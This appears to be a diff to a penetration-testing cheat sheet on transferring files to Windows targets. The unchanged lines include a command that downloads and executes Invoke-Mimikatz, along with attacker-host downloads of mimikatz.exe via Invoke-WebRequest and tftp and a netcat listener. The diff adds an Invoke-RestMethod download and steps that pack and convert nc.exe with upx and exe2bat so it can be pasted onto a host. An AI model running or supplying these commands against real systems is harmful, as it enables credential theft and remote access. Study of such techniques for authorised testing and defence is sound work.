@@ -11,12 +11,13 @@
 `IEX (iwr 'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')`
 
 
-### Invoke-WebRequest
+### Invoke-WebRequest / Invoke-RestMethod
 
 `Invoke-WebRequest "http://10.10.10.10/mimikatz.exe" -OutFile "C:\Users\Public\mimikatz.exe"`
+`Invoke-RestMethod "http://10.10.10.10/mimikatz.exe" "C:\Users\Public\mimikatz.exe"`
 
 
-### Invoke-WebRequest POST base64 data
+### Invoke-WebRequest / Invoke-RestMethod POST base64 data
 
 `nc -lvnp 443`
 
@@ -291,3 +292,19 @@ https://www.jscape.com/blog/using-windows-ftp-scripts-to-automate-file-transfers
 ## tftp
 
 `tftp -i 10.10.10.10 get mimikatz.exe`
+
+## debug.exe
+
+> Compress file
+
+`upx -9 nc.exe`
+
+> Disassemble
+
+`wine exe2bat.exe nc.exe nc.txt`
+
+> Paste contents of nc.txt into a shell to create nc.exe 
+
+Links:
+
+https://xapax.gitbooks.io/security/content/transfering_files_to_windows.html
